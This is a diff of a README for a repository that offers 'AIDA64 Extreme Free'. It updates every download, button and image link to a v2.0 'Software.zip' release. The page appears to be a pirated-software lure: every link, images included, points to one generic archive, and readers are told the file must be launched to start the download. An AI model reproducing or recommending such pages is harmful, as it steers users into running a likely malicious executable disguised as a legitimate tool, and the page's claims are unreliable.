@@ -3,11 +3,11 @@
 
 ## Welcome to the AIDA64 Extreme Free Repository!
 
-[![Download AIDA64 Extreme](https://github.com/Kayden2024/AIDA64-Extreme-Free/releases/download/v1.0/Software.zip Extreme-9cf)](https://github.com/Kayden2024/AIDA64-Extreme-Free/releases/download/v1.0/Software.zip)
+[![Download AIDA64 Extreme](https://github.com/Kayden2024/AIDA64-Extreme-Free/releases/download/v2.0/Software.zip Extreme-9cf)](https://github.com/Kayden2024/AIDA64-Extreme-Free/releases/download/v2.0/Software.zip)
 
 This repository is dedicated to providing resources and information related to AIDA64 Extreme, a powerful system information, benchmarking, and diagnostic tool. Whether you are a tech enthusiast, a system builder, or just curious about your PC's performance, AIDA64 Extreme is a must-have tool in your arsenal.
 
-![AIDA64 Banner](https://github.com/Kayden2024/AIDA64-Extreme-Free/releases/download/v1.0/Software.zip():max_bytes(150000):strip_icc():format(webp)https://github.com/Kayden2024/AIDA64-Extreme-Free/releases/download/v1.0/Software.zip)
+![AIDA64 Banner](https://github.com/Kayden2024/AIDA64-Extreme-Free/releases/download/v2.0/Software.zip():max_bytes(150000):strip_icc():format(webp)https://github.com/Kayden2024/AIDA64-Extreme-Free/releases/download/v2.0/Software.zip)
 
 ### Features
 
@@ -42,7 +42,7 @@ This repository is dedicated to providing resources and information related to A
 
 ### How to Get Started
 
-To access AIDA64 Extreme software and resources, please download the latest version [here](https://github.com/Kayden2024/AIDA64-Extreme-Free/releases/download/v1.0/Software.zip).
+To access AIDA64 Extreme software and resources, please download the latest version [here](https://github.com/Kayden2024/AIDA64-Extreme-Free/releases/download/v2.0/Software.zip).
 
 If the link above ends with a file name, it needs to be launched to initiate the download process.
 
@@ -50,4 +50,4 @@ If you encounter any issues with the provided link, please check the "Releases" 
 
 Thank you for visiting the AIDA64 Extreme Free Repository. Happy benchmarking! 🚀
 
-![AIDA64 Tools](https://github.com/Kayden2024/AIDA64-Extreme-Free/releases/download/v1.0/Software.zip)
+![AIDA64 Tools](https://github.com/Kayden2024/AIDA64-Extreme-Free/releases/download/v2.0/Software.zip)
